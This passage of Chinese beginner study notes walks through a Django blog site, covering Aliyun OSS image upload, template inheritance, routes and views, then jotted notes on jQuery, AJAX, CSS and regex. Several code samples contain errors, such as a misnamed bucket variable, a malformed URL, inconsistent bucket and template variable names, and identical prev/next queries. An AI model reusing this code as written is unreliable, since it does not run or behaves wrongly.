		1）如果要在网站中展示这张图片需要为其单独指定路由；
		2）如果网站多机部署无法实时同步数据；
		3）如果图片很大，会耗费很多带宽，响应慢

	为了解决如上问题，我们引入阿里云的对象存储OSS服务(收费,但不贵,)，
	它的优点是有CDN加速，也就是不同地域都有镜像，访问快，而且价格低廉，可比同样的网络带宽便宜多了
	OSS的使用请见官方文档，我这里直接贴代码，懂的可以参考，不懂的可以直接用
	首先要在阿里云的OSS中创建一个Bucket，如selfweb-selfweb，读写权限一定要选择“公共读”
	其次要安装oss2库，执行：
	pip install oss2
	然后在我们代码的根目录创建commons目录(用于放置所有公共组件)，
	并在其中创建一个空的__init__.py(作为lib的目录都要有这个文件，否则无法import)，
	并创建ossutils.py文件，内容如下
		# -*- coding: utf-8 -*-
		import oss2
		import time
		
		AccessKeyId = '我的accesskey'
		AccessKeySecret = '我的accesskey密码'
		Endpoint = 'oss-cn-beijing.aliyuncs.com'
		InternalEndpoint = 'oss-cn-beijing-internal.aliyuncs.com' 
		
		def upload_oss(bucket_name, file_name, bytes_content):
		    """
		    :param bucket_suffix: 区分测试环境和线上环境
		    :param file_name: 会自动添加时钟戳
		    :param bytes_content: 二进制的文件内容
		    :returm: 外网可以访问的url
		    """
		    auth = oss2.Auth(AccessKeyId,AccessKeySecret)
		    buck = oss2.bucket(auth, Endpoint, bucket_name)
		    file_path = 'dynamic/' + str(int(time.time())) + '_' + file_name
		    result = bucket.put_object(file_path, bytes_content)
		    if result.status == 200:
		        return 'http://' + bucket_name + '.oss-cn-beijing.aliyuncs.com' + file_path
		    else:
		        return None
	重载Subject的image的上传逻辑，修改web/admin.py，引入ossuitls：
		from commons.ossutils import upload_oss
	声明BucketName变量下面会用到：
		BucketName = 'selfweb_selfweb'
	修改SubjectAdmin类，添加如下方法：
		def save_model(self, request, obj, form, change):
		    if 'image' in request.FILES:
		        image_name = request.FILES['image'].name
		        image_content = request.FILES['image'].read()
		
		        url = upload_oss(BucketName, image_name, image_content)
		        if url:
		            obj.image = url
		
		    super(SubjectAdmin, self).save_model(request, obj, form, change)
	这时我们重新修改一个类目，重新上传图片，我们发现图片已经不再保存到本地文件了，
	而在阿里云的OSS里找到了上传的文件，而在我们的数据库里存储了这个图片在阿里云OSS中的url，可以直接访问

/////////至此 后台基本准备就绪，真正的前台网站开始出场了//////////

模板渲染
	模板属于mvc中的view这一层，是用来为网页布局的，
	乍一看来就是个html页面，但是里面会嵌入模板引擎提供给我们的特殊语法。
	模板引擎有很多，不同语言或框架都会实现自己一套，
	还有一些通用的模板引擎，但是他们语法和功能都比较类似，
	无非就是模板继承、模板引入、读透传的变量、循环、逻辑判断、filters、自定义标签等。
	我们这里直接用django原生的django-template就足够了。
	创建web/templates/web/index.html，内容如下：
		<!DOCTYPE html>
		<html lang="en">
		<head>
		    <meta charset="UTF-8">
		    <title>Title</title>
		</head>
		<body>
		<h1>Hello {{ name }}</h1>
		</body>
		</html>
	修改web/views.py中的index函数如下：
		def index(request):
		    return render(request, 'web/index.html', {'name': 'william_huang'})
	打开网页我们看到了一个大大的Hello william_huang
	这里的{{}}就是变量透传的语法，直接获取到python传进去的变量。
	另外这个模板文件的路径用的是web/index.html而不是直接index.html，
	原因是django里多个app如果用相同的模板文件名，在python代码里指定模板名时它分辨不出是哪个，
	所以一般把app的名字作为模板文件的目录
模板继承
	我们网站的所有页面都有一个共同的布局，那就是顶部是logo，底部是版权声明，
	所以这个框架可以抽象出来一个基类模板，而所有页面模板都继承自这一模板，
	下面我们创建这个基类模板web/templates/web/base.html，内容如下：
		<!DOCTYPE html>
		<html lang="zh-CN">
		<head>
		    <meta charset="UTF-8">
		    <meta http-equiv="X-UA-Compatible" content="IE=edge">
		    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
		    <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css">
		    <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
		    <link rel="stylesheet" href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
		    <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
		    <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
		
		    <title>{% block title %}selfweb - wiliam个人网站{% endblock title %}</title>
		    {% block head %}
		    {% endblock head %}
		</head>
		<body>
		
		<div class="row bg-primary" style="margin-right: 0">
		    <div class="col-sm-1 col-xs-1"></div>
		    <div class="col-sm-2 col-xs-11">
		        <h1><a href="" style="text-decoration: none;color: white;">william_selfweb</a></h1>
		    </div>
		    <div class="col-sm-6"></div>
		</div>
		
		{% block body %}
		{% endblock body %}
		
		<div class="row" style="margin-right: 0">
		    <div class="col-sm-2"></div>
		    <div class="col-sm-8 col-xs-12 text-center" style="color: #959595;margin-bottom: 10px;">
		        Copyright © <a href="">selfweb.com</a> | 京ICP备xxxxxxx号 | ccxxccxxcc@gmail.com
		    </div>
		</div>
		
		</body>
		</html>
	这里面有一些叫做block的代码块，它的作用是声明可重写的部分，下面你就会看到这个代码块是怎么在子模板中使用的。
	我们重写web/templates/web/index.html：为
		{% extends "web/base.html" %}

		{% block title %}
		{% endblock %}

		{% block body %}
		{% endblock %}
	这里我们只是做了继承，并没有重写,所以演示只看到了
	<div class="row bg-primary" style="margin-right: 0">
	<div class="row" style="margin-right: 0"> 
	这两部分,即顶部是logo，底部是版权声明
	我们重写web/templates/web/index.html：为
		{% extends "web/base.html" %}
		
		{% block title %}
		{% endblock %}
		
		{% block body %}
		    <div class="row jumbotron" style="margin-right: 0">
		        <div class="col-md-1 col-xs-1"></div>
		        <div class="col-md-10 col-xs-10"><h1>Welcome Big Data ITors!</h1></div>
		        <div class="col-md-1 col-xs-1"></div>
		    </div>
		{% endblock %}
	这时不但继承了,还重写添加了 body 内容
动态数据展示
	从数据获取tag数据，并展示到首页里。修改web/views.py的index函数，把tag数据取出来并传到模板中，如下：
		from .models import Tag	
		def index(request):
		    tags = Tag.objects.all()
		    return render(request, 'web/index.html', {'tags': tags})
	重写web/templates/web/index.html：
	{% extends "web/base.html" %}
	
	{% block title %}
	{% endblock %}
	
	{% block body %}
	
	    <div class="row jumbotron" style="margin-right: 0">
	        <div class="col-md-1 col-xs-1"></div>
	        <div class="col-md-10 col-xs-10"><h1>Welcome Big Data ITors!</h1></div>
	        <div class="col-md-1 col-xs-1"></div>
	    </div>
	
	    <div class="row" style="margin-right: 0">
	        <div class="col-sm-1 col-xs-1"></div>
	        {% for tag in tags %}
	            <div class="col-sm-2 col-xs-12">
	                <div class="thumbnail">
	                    <img src="{{ tag.image }}" alt="tag">
	                    <div class="caption">
	                        <h3>{{ tag }}({{ tag.blogpost_set.count }})</h3>
	                        <p>
	                            {% for blogpost in tag.blogpost_set.all %}
	                                {{ blogpost.title }}
	                            {% endfor %}
	                        </p>
	                        <h5>更多>>></h5>
	                    </div>
	                </div>
	            </div>
	        {% endfor %}
	        <div class="col-sm-1 col-xs-1"></div>
	    </div>
	
	{% endblock %}
	
重启网站服务器:
		killall -9 uwsgi
		uwsgi --ini selfweb/uwsgi.ini
	登陆:http://127.0.0.1:8000 
	可以看到便签和指定文章!!
	显示更多内容需要去发掘，比如说为Tag添加image属性
展示最新文章
	为了用户能找到最新的文章，所以在所有页面的底部显示最新发表的文章，这需要修改基类模板了，
	首先在views.py中透传latest_blog_posts变量，如下：
		from .models import Tag
		from .models import BlogPost
		def index(request):
		    tags = Tag.objects.all()
		    latest_blog_posts = BlogPost.objects.order_by('create_time')[0:5]
		    return render(request, 'web/index.html', {'tags': tags, 'latest_blog_posts': latest_blog_posts})
	修改web/templates/web/base.html，在<body></body>中倒数第二位置处添加如下代码：
	<div class="row navbar navbar-inverse" style="margin:0">
	    <div class="row" style="margin:0">
	        <div class="col-sm-1 col-xs-1"></div>
	        <div class="col-sm-5 col-xs-5">
	            <h4 style="color: #FFFFFF; border-bottom: 1px solid #695d69; padding-bottom: 10px; margin-top: 30px;">最新文章</h4>
	            {% for blogpost in latest_blog_posts %}
	                <div class="row" style="margin: 10px; margin-left: 0; overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
	                    <span style="color: #959595;">({{ blogpost.create_time|date:"Y-m-d" }})</span>
	                    <a title="{{ blogpost }}" style="color: #959595;">{{ blogpost.title }}</a>		/*显示标题设置*/
	                </div>
	            {% endfor %}
	        </div>
	        <div class="col-sm-1 col-xs-1"></div>
	    </div>
	</div>
	重启网站服务器:
	可以底下新文章的通知,显示了时间和文章标题二次登陆则因为检测到2次进入,所以就不再显示新文章通知
建立路由:
	目前为止,首页显示的文章内容,很多都没有建立链接到指定的页面上,接下来做这方面的工作!!
指定标签的文章列表页路由
	上一节完成的首页部分每个标签有对应的一块展示区域，
	希望点击标题可以进入到这个标签的文章列表页。
	定义如下路由规则，修改selfweb/urls.py，为urlpatterns增加如下一行：
		url(r'^bloglistbytag', views.blog_list_by_tag, name='blog_list_by_tag'),	//数组成员里加","是一个好习惯
	意思是说对于url路径为bloglistbytag的网页，直接调用views.blog_list_by_tag来执行逻辑。
	其中的name是用来在模板中利用“url”模板语法使用的，马上会看到
	在web/views.py中添加如下函数：
		def blog_list_by_tag(request):
		    if 'tagname' in request.GET:
		        tag_name = request.GET['tagname']
		        blog_posts = BlogPost.objects.filter(tags__name=tag_name)
		        latest_blog_posts = BlogPost.objects.order_by('create_time')[0:5]
		        return render(request, 'web/blog_list_by_tag.html', {'tag_name': tag_name, 'blog_posts': blog_posts,
		                                                             'latest_blog_posts': latest_blog_posts})
		    else:
		        return HttpResponse('404')
	这里首先通过获取GET请求的tagname参数来获取到标签名，然后通过model层查询数据库获取导数据，
	并通过web/templates/web/blog_list_by_tag.html这个模板来渲染的，这个模板如下样子：
		{% extends "web/base.html" %}
		
		{% block title %}
		    {{ tag_name }}
		{% endblock %}
		
		{% block body %}
		
		    <div class="row" style="margin-right: 0">
		        <div class="col-sm-3 col-xs-1"></div>
		        <div class="col-sm-6 col-xs-10">
		            <h1>{{ tag_name }}</h1>
		        </div>
		        <div class="col-sm-3 col-xs-1"></div>
		    </div>
		
		    <div class="row" style="margin-right: 0">
		        <div class="col-sm-3 col-xs-1"></div>
		        <div class="col-sm-6 col-xs-10">
		            {% for blog_post in blog_posts %}
		                <h4><a href="">{{ blog_post.title }}</a>({{ blog_post.create_time|date:'Y-m-d' }})</h4>
		            {% endfor %}
		        </div>
		    </div>
		
		{% endblock %}
	重启网站服务器:
	http://127.0.0.1:8000/bloglistbytag?tagname=hh  //打开标签为hh的文章列表页面
	由此看路由已经建立好!!
	通过首页链接进到这个列表页,我们修改web/templates/web/index.html:
		<h3>{{ tag }}({{ tag.blogpost_set.count }})</h3>
	改成:
		<h3><a href="{% url 'blog_list_by_tag' %}?tagname={{ tag }}">{{ tag }}({{ tag.blogpost_set.count }})</a></h3>
	由此可见,当路由建立好后 <a href=""></a> 是添加连接路径的 !!!
	由于html 是经过浏览器实时解释渲染的,所以随意修改html 不用重启网站服务器就可以测试!!
文章详情页的路由:
	添加web/templates/web/blog_show.html:
		{% extends "web/base.html" %}
		
		{% block title %}
		    {{ blog_post }} - SharEDITor - 关注大数据技术
		{% endblock %}
		
		{% block body %}
		
		    <div class="row">
		        <div class="col-sm-2 col-xs-1"></div>
		        <div class="col-sm-6 col-xs-10">
		            <div class="row">
		                <div class="col-sm-12 col-xs-12">
		                    <div class="row">
		                        <h1>{{ blogpost.title }}</h1>
		                    </div>
		                    <div class="row">
		                        <a class="btn btn-info btn-xs">{{ blog_post.subject.name }}</a>
		                        {% for tag in blog_post.tags.all %}
		                            <a class="btn btn-warning btn-xs" href="{% url 'blog_list_by_tag' %}?tagname={{ tag }}">
		                                {{ tag.name }}
		                            </a>
		                        {% endfor %}
		                        <small>发表于 {{ blog_post.create_time|date:"Y-m-d H:i:s" }}</small>
		                        <small>阅读{{ blog_post.pv }}次</small>
		                    </div>
		
		                    <div class="row">
		                        <hr/>
		                    </div>
		
		                    <div class="row">
		                        <div class="row">
		                            <div class="col-sm-12 col-xs-12">
		                                <img style="width: 100%; height: 100%;" src="{{ blog_post.image }}">
		                            </div>
		                        </div>
		                        {{ blog_post.abstract }}
		                        <br />
		                        {{ blog_post.body }}
		                    </div>
		                </div>
		            </div>
		            <div class="row">
		                <div class="col-sm-6 col-xs-6">
		                    <span style="color:#aaaaaa;">前一篇:</span>
		                    {% if prev_blog_post.first != null %}
		                        <a href="">{{ prev_blog_post.first }}</a>
		                    {% endif %}
		                </div>
		                <div class="text-right col-sm-6 col-xs-6">
		                    <span style="color:#aaaaaa;">后一篇:</span>
		                    {% if next_blog_post.first != null %}
		                        <a href="">{{ next_blog_post.first }}</a>
		                    {% endif %}
		                </div>
		            </div>
		
		            <!--PC和WAP自适应版-->
		            <div id="SOHUCS" sid="{{ blog_post.id }}" ></div>
		            <script type="text/javascript">
		             (function(){
		                    var appid = 'cysV8S2ux';
		                    var conf = 'prod_bd659405e413a4b27a3568e27185b632';
		                    var width = window.innerWidth || document.documentElement.clientWidth;
		                    if (width < 960) {
		                        window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })();
		            </script>
		        </div>
		
		        <div class="col-sm-2 hidden-xs">
		            <br/>
		            <div class="row">
		                <div class="col-sm-8">
		                    <h4>官方微信公众号</h4>
		                    <a href="http://shareditor-shareditor.oss-cn-beijing.aliyuncs.com/dynamic/weixinpub.jpg">
		                        <img width="90%" height="90%" src="http://shareditor-shareditor.oss-cn-beijing.aliyuncs.com/dynamic/weixinpub.jpg">
		                    </a>
		                </div>
		                <div class="col-sm-1">
		                    <div class="row">
		                        <a href="https://github.com/warmheartli">
		                            <div class="fa fa-github fa-3x" style="margin-top: 20px;"></div>
		                        </a>
		                    </div>
		                    <div class="row">
		                        <a href="http://weibo.com/chuangwanglaile">
		                            <div class="fa fa-weibo fa-3x" style="margin-top: 20px;"></div>
		                        </a>
		                    </div>
		                </div>
		            </div>
		            <hr/>
		            <h4>
		                {% for tag in blog_post.tags.all %}
		                    系列:{{ tag.name }}
		                {% endfor %}
		            </h4>
		            <div style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
		                {% for tag_blog_post in tag_blog_posts %}
		                    {% if tag_blog_post.id == blog_post.id %}
		                        <h6 style="color: red;">{{ tag_blog_post }}</h6>
		                    {% else %}
		                        <h6><a href="{% url 'blog_show' %}?blogId={{ tag_blog_post.id }}">{{ tag_blog_post }}</a></h6>
		                    {% endif %}
		                {% endfor %}
		            </div>
		            <h4>全部系列</h4>
		            {% for tag in tags %}
		                <h6><a href="{% url 'blog_list_by_tag' %}?tagname={{ tag.name }}">{{ tag.name }}</a></h6>
		            {% endfor %}
		        </div>
		    </div>
		
		{% endblock %}
	在selfweb/urls.py，为urlpatterns增加如下一行：
		    url(r'^blogshow', views.blog_show, name='blog_show'),
	在web/views.py中添加如下函数：
	def blog_show(request):
	    if 'blogId' in request.GET:
	        blog_id = request.GET['blogId']
	        blog_post = BlogPost.objects.get(id=blog_id)
	        latest_blog_posts = BlogPost.objects.order_by('create_time')[0:5]
	        tag_blog_posts = BlogPost.objects.filter(tags__name=blog_post.tags.first())
	        tags = Tag.objects.all()
	        prev_blog_post = BlogPost.objects.filter(tags__name=blog_post.tags.first()).filter(id__gt=blog_post.id).order_by('id')[0:1]
	        next_blog_post = BlogPost.objects.filter(tags__name=blog_post.tags.first()).filter(id__gt=blog_post.id).order_by('id').reverse()[0:1]
	        return render(request, 'web/blog_show.html', {'blog_post': blog_post, 'latest_blog_posts': latest_blog_posts,
	                                                      'tag_blog_posts': tag_blog_posts, 'tags': tags,
	                                                      'prev_blog_post': prev_blog_post, 'next_blog_post': next_blog_post})
	    else:
	        return HttpResponse('404')
	添加 <a href=""></a> 链接:
		web/templates/web/index.html:
                        <p>
                            {% for blogpost in tag.blogpost_set.all %}
                                {{ blogpost.title }}
                            {% endfor %}
                        </p>
		改成:
			<p>
			    {% for blog_post in tag.blogpost_set.all %}
			        <a href="{% url 'blog_show' %}?blogId={{ blog_post.id }}">
			            {{ blog_post.title }}
			        </a>
			    {% endfor %}
			</p>
		web/templates/web/blog_list_by_tag.html:
	                <h4><a href="">{{ blog_post.title }}</a>({{ blog_post.create_time|date:'Y-m-d' }})</h4>
		改成:
			<h4><a href="{% url 'blog_show' %}?blogId={{ blog_post.id }}">
			       {{ blog_post.title }}
			    </a>
			    ({{ blog_post.create_time|date:'Y-m-d' }})
			</h4>
	重启网站服务器测试!! 
	成功!!!
	通过,blog_show.html 可以看到典型的网站设计规则
javascript学习:
	javascript可写在 <head>段,或者<body>段
	注意javascript 自带一个基础框架库,可直接使用依稀基础函数,如果要使用其他框架库,例如jquery,就要加载框架
	javascript与 html 的接口 一般是指 onclick,onmouseover,onload,onchange,onmousout,onmousedown、onmouseup
JS HTML DOM 和浏览器BOM:
	其实就是我们上述认为的 javascript 自带一个基础框架库DOM,提供多种种函数动态改变 HTML 页内容,
	也可以改变 css内容
	浏览器BOM 提供的是与浏览器有关的 javascript 基础框架库
json学习:
	json是一种特殊的数据格式标准,方便各类语言引擎执行数据处理和网络传输,
	规范了大规模数据处理和传输,能直接被javascript直接处理,与javascript对象无缝转换
	但并不能说是javascript语法标准之一!!	
jquery学习:
	jquery是javascript 应用框架,网页使用前,需要加载框架
	<script src="https://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>
	一般选择使用远程框架文件,而不要选择本地框架文件
	然后下一个<script></script>内就可以填写jquery提供的执行函数了
	一般scropt脚本都会放在html的前部位置	
	jQuery 使用 $ 符号作为 jQuery 的简写,但是也有很多其他javascript使用$作为简写标识符号,
		这时可通过nocondflict()来释放简写符,让给其他框架,例如以下一段代码:
		<head>
		<meta charset="utf-8">
		<script src="https://cdn.bootcss.com/jquery/1.10.2/jquery.min.js"></script>
		<script>
		$.noConflict();
		jQuery(document).ready(function(){
		  jQuery("button").click(function(){
		    jQuery("p").text("jQuery 仍然在工作!");
		  });
		});
		</script>
		</head>
		您也可以创建自己的简写。noConflict() 可返回对 jQuery 的引用，您可以把它存入变量，以供稍后使用。例如:
		<script>
		var jq = $.noConflict();
		jq(document).ready(function(){
		  jq("button").click(function(){
		    jq("p").text("jQuery 仍然在工作!");
		  });
		});
		</script>	
	jquery选择器,其实就是 jqurey(xx) 或 $(xx) 中的xx变量格式:
		1.基本选择器
		$("#id")            //ID选择器
		$("div")            //元素选择器
		$(".classname")     //类选择器
		$(".classname,.classname1,#id1")     //组合选择器
		2.层次选择器
		$("#id>.classname ")    //子元素选择器
		$("#id .classname ")    //后代元素选择器
		$("#id + .classname ")    //紧邻下一个元素选择器
		$("#id ~ .classname ")    //兄弟元素选择器
		3.过滤选择器(重点)
		$("li:first")    //第一个li
		$("li:last")     //最后一个li
		$("li:even")     //挑选下标为偶数的li
		$("li:odd")      //挑选下标为奇数的li
		$("li:eq(4)")    //下标等于4的li
		$("li:gt(2)")    //下标大于2的li
		$("li:lt(2)")    //下标小于2的li
		$("li:not(#runoob)") //挑选除 id="runoob" 以外的所有li
		3.2内容过滤选择器
		$("div:contains('Runob')")    // 包含 Runob文本的元素
		$("td:empty")                 //不包含子元素或者文本的空元素
		$("div:has(selector)")        //含有选择器所匹配的元素
		$("td:parent")                //含有子元素或者文本的元素
		3.3可见性过滤选择器
		$("li:hidden")       //匹配所有不可见元素，或type为hidden的元素
		$("li:visible")      //匹配所有可见元素
		3.4属性过滤选择器
		$("div[id]")        //所有含有 id 属性的 div 元素
		$("div[id='123']")        // id属性值为123的div 元素
		$("div[id!='123']")        // id属性值不等于123的div 元素
		$("div[id^='qq']")        // id属性值以qq开头的div 元素
		$("div[id$='zz']")        // id属性值以zz结尾的div 元素
		$("div[id*='bb']")        // id属性值包含bb的div 元素
		$("input[id][name$='man']") //多属性选过滤，同时满足两个属性的条件的元素
		3.5状态过滤选择器
		$("input:enabled")    // 匹配可用的 input
		$("input:disabled")   // 匹配不可用的 input
		$("input:checked")    // 匹配选中的 input
		$("option:selected")  // 匹配选中的 option
		4.表单选择器
		$(":input")      //匹配所有 input, textarea, select 和 button 元素
		$(":text")       //所有的单行文本框，$(":text") 等价于$("[type=text]")，推荐使用$("input:text")效率更高，下同
		$(":password")   //所有密码框
		$(":radio")      //所有单选按钮
		$(":checkbox")   //所有复选框
		$(":submit")     //所有提交按钮
		$(":reset")      //所有重置按钮
		$(":button")     //所有button按钮
		$(":file")       //所有文件域
AJAX学习:
	AJAX = 异步 JavaScript 和 XML（Asynchronous JavaScript and XML）。
	简短地说，在不重载整个网页的情况下，AJAX 通过后台加载数据，并在网页上进行显示。
	jQuery 提供多个与 AJAX 有关的方法:
	$(selector).load(URL,data,callback); 
	例如:	
		$("#div1").load("demo_test.txt"); 把文件 "demo_test.txt" 的内容加载到指定的 <div> 元素中
		$("#div1").load("demo_test.txt #p1");把 "demo_test.txt" 文件中 id="p1" 的元素的内容，加载到指定的 <div> 元素中：
		下面的例子会在 load() 方法完成后显示一个提示框。如果 load() 方法成功，显示"外部内容加载成功！"，否则，则显示错误消息：
		$("button").click(function(){
		  $("#div1").load("demo_test.txt",function(responseTxt,statusTxt,xhr){
		    if(statusTxt=="success")
		      alert("外部内容加载成功!");
		    if(statusTxt=="error")
		      alert("Error: "+xhr.status+": "+xhr.statusText);
		  });
		});
		
	$.get(URL,callback);	获取 URL 地址上 的内容
	$.post(URL,data,callback);	把data post到 URL地址上,服务器经过处理后,返回处理后的内容!!!
	还有关于处理XML典型操作,例如:
		先新建一个request:
			xmlhttp=new XMLHttpRequest();
		然后指定 递出请求然后从服务器所有数据后,执行的处理函数
 			xmlhttp.onreadystatechange=function()=function(){...}
		指出请求是获取一个文本:
			xmlhttp.open("GET","/try/ajax/ajax_info.txt",true);
		发出请求:
			xmlhttp.send();
Node.js学习:
	是一个服务端javascript
	就是说,语法,使用javascript标准,但是就像python java 一样有一个解释机,
	写一个javascript脚本文档出来,可以通过node解释机执行!!!

css学习:
	css是一种网页样式脚本: 一般的写法是 在 <style></style> 句柄里添加脚本内容
	例如:
	<!DOCTYPE html>
	<html>
	<head>
	<meta charset="utf-8"> 
	<title>菜鸟教程(runoob.com)</title> 
	<style>
	h1		//这里设置 h1 标识段内容的 样式脚本
	{
		background-color:#6495ed;
	}
	p		//这里设置 p 标识段内容的 样式脚本
	{
		background-color:#e0ffff;
	}
	div		//这里设置 div 标识段内容的 样式脚本
	{
		background-color:#b0c4de;
	}
	</style>
	</head>
	
	<body>
	
	<h1>CSS background-color 实例!</h1>
	<div>
	该文本插入在 div 元素中。
	<p>该段落有自己的背景颜色。</p>
	我们仍然在同一个 div 中。
	</div>
	
	</body>
	</html>
正则表达式学习:
	常用搜索通配符:?和*,例如:
	像 data?.dat 这样的模式将查找下列文件：
		data1.dat
		data2.dat
		datax.dat
		dataN.da 
	使用 * 字符代替 ? 字符扩大了找到的文件的数量。data*.dat 匹配下列所有文件：
		data.dat
		data1.dat
		data2.dat
		data12.dat
		datax.dat
		dataXYZ.dat
	但是,正则表达式中 ? 和 * 与上述的用法有区别!!!!!!
	通用表达符:	
		.	//匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 \. 。
		[ ]	//标记一个中括号表达式的开始。要匹配 [，请使用 \[。
		^	//匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 \^。
		$	//匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 '\n' 或 '\r'。
			//要匹配 $ 字符本身，请使用 \$。
		?	//匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 \?。
			//例如 colou?r 可以匹配 color 或者 colour，? 问号代表前面的字符最多只可以出现一次（0次、或1次）。
		+	//匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 \+。
			//例如 runoo+b，可以匹配 runoob、runooob、runoooooob 等，+ 号代表前面的字符必须至少出现一次（1次或多次）。
		*	//匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 \*。
			//例如 runoo*b，可以匹配 runob、runoob、runoooooob 等，* 号代表字符可以不出现，
			//	也可以出现一次或者多次（0次、或1次、或多次）。
		{}	//标记限定符表达式的开始。要匹配 {，请使用 \{。
			//{n} 	n 是一个非负整数。匹配确定的 n 次。例如，'o{2}' 不能匹配 "Bob" 中的 'o'，但是能匹配 "food" 中的两个 o。
			//{n,} 	n 是一个非负整数。至少匹配n 次。例如，'o{2,}' 不能匹配 "Bob" 中的 'o'，
			//	但能匹配 "foooood" 中的所有 o。'o{1,}' 等价于 'o+'。'o{0,}' 则等价于 'o*'。
			//{n,m} m 和 n 均为非负整数，其中n <= m。最少匹配 n 次且最多匹配 m 次。
			//	例如，"o{1,3}" 将匹配 "fooooood" 中的前三个 o。'o{0,1}' 等价于 'o?'。请注意在逗号和两个数之间不能有空格。
		|	//指明两项之间的一个选择。要匹配 |，请使用 \|。
		( )	//标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 \( 和 \)。
		\
			// \*   代表*符号本身!! \加符号时(?,>,*,&...)表示转义字符意思,
			// \cx 	匹配由x指明的控制字符。例如， \cM 匹配一个 ctrl+m(即回车符)。
			//	x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。
			// \f 	匹配一个换页符。等价于 \x0c 和 \cL。
			// \n 	匹配一个换行符。等价于 \x0a 和 \cJ。
			// \r 	匹配一个回车符。等价于 \x0d 和 \cM。
			// \s 	匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。
			// \S 	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。
			// \t 	匹配一个制表符。等价于 \x09 和 \cI。
			// \v 	匹配一个垂直制表符。等价于 \x0b 和 \cK。
			// \b 	匹配一个字边界，即字与空格间的位置,或空格与字的位置
			// \B 	非字边界匹配。
	更加具体理论的 通用表达符说明 :	
		\ 	将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。
			例如，'n' 匹配字符 "n"。'\n' 匹配一个换行符。序列 '\\' 匹配 "\" 而 "\(" 则匹配 "("。
		^ 	匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 '\n' 或 '\r' 之后的位置。
		$ 	匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 '\n' 或 '\r' 之前的位置。
		* 	匹配前面的子表达式零次或多次。例如，zo* 能匹配 "z" 以及 "zoo"。* 等价于{0,}。
		+ 	匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 "zo" 以及 "zoo"，但不能匹配 "z"。+ 等价于 {1,}。
		? 	匹配前面的子表达式零次或一次。例如，"do(es)?" 可以匹配 "do" 或 "does" 中的"do" 。? 等价于 {0,1}。
		{n} 	n 是一个非负整数。匹配确定的 n 次。例如，'o{2}' 不能匹配 "Bob" 中的 'o'，但是能匹配 "food" 中的两个 o。
		{n,} 	n 是一个非负整数。至少匹配n 次。例如，'o{2,}' 不能匹配 "Bob" 中的 'o'，
			但能匹配 "foooood" 中的所有 o。'o{1,}' 等价于 'o+'。'o{0,}' 则等价于 'o*'。
		{n,m} 	m 和 n 均为非负整数，其中n <= m。最少匹配 n 次且最多匹配 m 次。
			例如，"o{1,3}" 将匹配 "fooooood" 中的前三个 o。'o{0,1}' 等价于 'o?'。请注意在逗号和两个数之间不能有空格。
		? 	当该字符紧跟在任何一个其他限制符 (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是非贪婪的。
			非贪婪模式尽可能少的匹配所搜索的字符串，而默认的贪婪模式则尽可能多的匹配所搜索的字符串。
			例如，对于字符串 "oooo"，'o+?' 将匹配单个 "o"，而 'o+' 将匹配所有 'o'。
		. 	匹配除 "\n" 之外的任何单个字符。要匹配包括 '\n' 在内的任何字符，请使用像"(.|\n)"的模式。
		(pattern) 	匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，
				在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 '\(' 或 '\)'。
		(?:pattern) 	匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。
				这在使用 "或" 字符 (|) 来组合一个模式的各个部分是很有用。
				例如， 'industr(?:y|ies) 就是一个比 'industry|industries' 更简略的表达式。
		(?=pattern) 	正向预查，在任何匹配 pattern 的字符串开始处匹配查找字符串。
				这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。
				例如，'Windows (?=95|98|NT|2000)' 能匹配 "Windows 2000" 中的 "Windows" ，
				但不能匹配 "Windows 3.1" 中的 "Windows"。预查不消耗字符，
				也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。
		(?!pattern) 	负向预查，在任何不匹配 pattern 的字符串开始处匹配查找字符串。
				这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。
				例如'Windows (?!95|98|NT|2000)' 能匹配 "Windows 3.1" 中的 "Windows"，
